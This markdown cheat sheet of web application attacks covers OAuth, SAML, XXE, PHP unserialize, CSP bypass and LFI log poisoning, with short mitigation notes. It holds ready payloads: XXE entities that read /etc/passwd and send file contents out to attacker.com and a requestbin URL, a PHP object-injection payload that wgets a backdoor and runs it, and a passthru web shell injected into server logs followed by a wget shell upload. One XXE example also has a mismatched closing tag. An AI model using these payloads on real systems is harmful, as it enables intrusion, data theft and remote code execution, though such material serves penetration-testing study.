## Authentication - OAuth
---

**Summary**  

_Open Authentication_ is where you give access to a 3rd party to use your account.

![OAuth Diagram](Resources/OAuth.png) 

_OAuth1 (Transport-independent)_: Security is delegated to cryptographically signing each message. If a message within the communication is signed improperly, the entire transaction will be invalidated.  

_OAuth2 (Transport-dependent)_: Security is delegated to HTTPS/TLS encryption. Improper TLS configuration or failure to properly validate a certificate can lead to a MiTM attack.  

Four types of OAuth grants:
1. _Authorisation Grant_: shown above, a redirection-based flow.
  * The most commonly used type of grant.
2. _Implicit Grant_: used with mobile apps or web apps.
  * Is a redirection-based flow except ACCESS_TOKEN is given to the USER to forward to the CLIENT, rather than given to the CLIENT directly.
3. _Resource Owner Password Credentials Grant_: used with trusted applications, such as those owned by the service itself.
  * The USER provides user/password directly to the CLIENT, which uses the creds to obtain an ACCESS_TOKEN from the SERVICE. This should only be used if the user can trust the application. (e.g. Snap -> Bitmoji access)
4. _Client Credentials Grant_: used with application’s API access.
  * CLIENT requests ACCESS_TOKEN by sending its creds, its CLIENT_ID and CLIENT_SECRET to the AUTH_SERVER.  

**Exploitation**  

_Eavesdropping or leaking Authorisation codes_: referrer header leakage, logs, open redirect, browser history.  

_Open Redirect_: victim can receive a URL which looks legit but will redirect them to a malicious URL.  

_Obtaining Authorisation codes from Auth Server DB_  

_CSRF against OAuth v2_:
* (CSRF: Forces user to execute unwanted actions on a site that they are currently authenticated in)
* (Cause: App does not verify if an action was intended to be initiated by the user and not a malicious 3rd party)
* (Defence: CSRF Token / “State” token in OAuth)
1.	Attacker assumes Victim is logged in on consumer site. Attacker logins and triggers an OAuth workflow.
2.	Attacker places their Authorisation Grant redirect URL(http://consumer-site.example/auth?code=12345”) on a web page (https://evil.com)
3.	Attacker phishes victim to visit the site, which will request the Authorisation grant URL.
4.	By visiting the Authorisation grant URL, the victim has authorised the attacker to have full access to the victim’s account on the consumer site.  

**Mitigation**  

Open Redirect defences:
* TLS encryption, strong authentication between client/server, allow only one-use token, reduce scope of tokens, flush browser cache.

Defences against obtaining Authorisation codes from Auth Server DB:
* Parameterize your queries, store access tokens with a one-way method, good DB security.  

## Authentication - SAML
---

**Summary**  

XML input containing a reference to an external entity which is processed by a weakly configured XML parser, enabling disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. (OWASP)

<a href="https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/">Common SAML Implementation Mistakes</a> 

SAML Components:
* _Relay State_: a token to reference state information maintained by the Service Provider (SP).  
* _SAMLResponse_: the response from the Identity Provider (IDP) containing the base64 encoded Assertion to the SP.

**Exploitation**  

_Make sure to try [XXE attack vectors](#xml--xml-external-entities)_  

Modifying `NotBefore` or `NotOnOrAfter` values.
* Change values to a datetime which is valid within the time you want to make the malicious request.

Modifying SAML Attributes
* Some attributes may exist such as `userType`, which you may change to perform privilege escalation.

## XML – XML External Entities
---

**Summary**

_XML DTD (XML Document Type Declaration)_ is used to define the structure of the XML document, with a list of legal elements.  
* Provides a way for applications to share data using a common structure, to verify that the data received is valid.  
* Allows creation of Entities.  

_General entities_ - can be used in XML content like &name;  
`<!ENTITY name "Hello World">`  

_Parameter entities_: - can be used inside doctype definition like %name; (parameter entities can insert new entities) and inside entities values like %name;  
`<!ENTITY % name "Hello World">`  
`<!ENTITY % name "Hello %myEntity;">`  

_External entities_ - entities with query to external (not declared in current XML document) resource (can be used both: general entities and parameter entities)  
    `<!ENTITY name SYSTEM "URI/URL">`  
    `<!ENTITY name PUBLIC "any_text" "URI/URL">`  

_External entities_ - can be used for doctypes too:  
    `<!DOCTYPE name SYSTEM "address.dtd" [...]>`  
    `<!DOCTYPE name PUBLIC "any text" "http://evil.com/evil.dtd">`  


**Exploitation**  

Basic XXE Test
  ```xml
  <!DOCTYPE test [<!ENTITY example "Hello World"> ]>
  <test>
    <hello>&example;</hello>
  </userInfo>
  ```

Local File Inclusion  
  ```xml
  <!DOCTYPE data [
      <!ELEMENT lol ANY>
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <lol>&xxe;</lol>
  ```

Remote File Inclusion / SSRF  
  ```xml
  <!DOCTYPE data [
      <!ELEMENT lol ANY>
      <!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">
      &xxe;
  ]>
  <lol>&file;</lol>
  ```  
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/hosts">
  ```  

XXE Out of Bounds attack (XXE OOB) - Sending the response/data to your own server as output doesn't show on site.  
  ```xml
  <!DOCTYPE data [
    <!ENTITY dtd SYSTEM "https://attacker.com/evil.dtd">
    &dtd; 
  ]>
  <data>&send;</data>
  ```
  ```xml
  <!ENTITY % file SYSTEM "file:///c:/boot.ini">
  <!ENTITY % all "<!ENTITY send SYSTEM 'https://requestbin.fullcontact.com/1cxrgsm1/?%file;'>">
  &all;
  ```

**Exploitation: PHP-based** 

RCE (expect:// - Process Interaction Stream)  
  `<!ENTITY xxe SYSTEM "expect://id">`

PHP Filters  
  ```xml
  file:// — Accessing local filesystem
  http:// — Accessing HTTP(s) URLs
  ftp:// — Accessing FTP(s) URLs
  php:// — Accessing various I/O streams
  data:// — Data (RFC 2397)
  glob:// — Find pathnames matching pattern
  ssh2:// — Secure Shell 2
  ```  

**Exploitation: Other Tricks**

_WAF_: Use `PUBLIC` if `SYSTEM` is blocked.  
_Encoding_: Change encoding e.g. UTF-8 -> UTF-16 `<?xml version="1.0" encoding="UTF-16"?>`.  
^Use `cat file.xml | iconv -f UTF-8 -t UTF-16 > file_utf16.xml` to convert to UTF-16.  

**Mitigation**

IF POSSIBLE: Disable DTD's (`<!DOCTYPE x [ ]>`).  
ELSE: Disallow loading XML external entities (entities with queries to external resources).  


## PHP Un-serialize
---

**Summary**  

Allows an attacker to perform _code / sql injection_, _path traversal_ and _denial of service_ attacks due to user-input not being properly sanitised before being passed to the `unseralize()` PHP function. (OWASP)

Since PHP allows object serialisation, attackers can pass in a malicious string to a vulnerable `unserialize()` call, resulting in arbitrary PHP object injection.  

_See more_: <a href="https://www.owasp.org/index.php/PHP_Object_Injection">PHP Object Injection</a>  
_PHP Magic Methods_: http://php.net/manual/en/language.oop5.magic.php  

Anatomy of a PHP Object:  
![PHP Object Unserialized](Resources/PHP_Unserialize.png)

Example:  
![PHP Object Unserialized](Resources/PHP_Unserialize2.png)

**Exploitation**

Example: Deleting an arbitrary file via. Path Traversal
```PHP
class Example1 {
   public $cache_file;

   function __construct() {
      // some PHP code...
   }

   function __destruct() {
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}
// some PHP code...
$user_data = unserialize($_GET['data']);
// some PHP code...

// PAYLOAD //
http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
```

Example: Reverse Shell
```PHP
class PHPObjectInjection
{
   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
   public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
}
// GENERATE ENCODED PAYLOAD
echo urlencode(serialize(new PHPObjectInjection));
```

Example: Local File Disclosure
```PHP
class PHPObjectInjection
{
   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
   public $inject = "system('cat /etc/passwd');";
}

echo urlencode(serialize(new PHPObjectInjection));
//O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A26%3A%22system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%22%3B%7D
//'O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system(\'cat+/etc/passwd\');";}'
```

**Mitigation**

Do not use unserialize() function with user-supplied input, use JSON functions instead i.e. `json_encode()` / `json_decode()`.

## Advanced XSS - Content Security Policy Bypass
---  

**Summary**  

CSP is a security standard introduced to prevent attacks resulting from execution of malicious content in a trusted page. It allows website owners to declare approved origins of content that browsers should allow to load on that website.    

Example: `script-src userscripts.example.com`  
* Means only `userscripts.example.com` can provide scripts to be executed. INLINE SCRIPTS WON’T WORK.

CSP Components:  
`none`: matches nothing  
`self`: matches the current origin, but NOT its subdomains  
`unsafe-inline`: allows inline JavaScript and CSS.  
`unsafe-eval`: allows text-to-JavaScript mechanisms like eval  

**Exploitation**  

_Misconfigurations_: example write-up on Twitter CSP Bypass (misconfiguration)  
_JSONP_: including controlled JavaScript on the domain.  
_Polyglots_: CSP Bypass using Polyglot jpeg/javascript

**Mitigation**


## Advanced Injection
---  

**Summary**  

LFI vs LFD:
* _Local File Inclusion_: Where you can EXECUTE files locally on the server.
* _Local File Disclosure_: Where you can SEE the local files on the server.

**Exploitation: PHP Log File Injection**  

STEP #1: Verify existence of LFI/LFD vulnerability.
```
domain.com/?p=somepage.txt
domain.com/?p=pagename-whatever
domain.com/?class=something&function=another 
```

STEP #2: Figure out where the logfiles are. Example locations:
```
/usr/local/etc/php
/etc/php.d/*.ini
/etc/php5/cli/php.ini
/usr/local/lib/php.ini
/etc/php.ini
  
/var/log/apache2/access.log
/var/log/httpd/error_log
/var/log/apache2/error.log
/var/log/httpd-error.log
```

STEP #3: Send a malicious request to inject a payload into the logfile:

  * _PHP passthru() function_: Execute an external program and display raw output
  * Attack vectors:
     * URL query string: `example.com/?q=injectpaylod`
     * HTTP Headers: Referer header.
```
<?php passthru($_GET['cmd']); ?>
<?php passthru(['ls -l']); ?>
```

STEP #4: With command execution, use wget to upload your own files to the server:
```
/var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
OR
<?php passthru(['w']); ?>
```
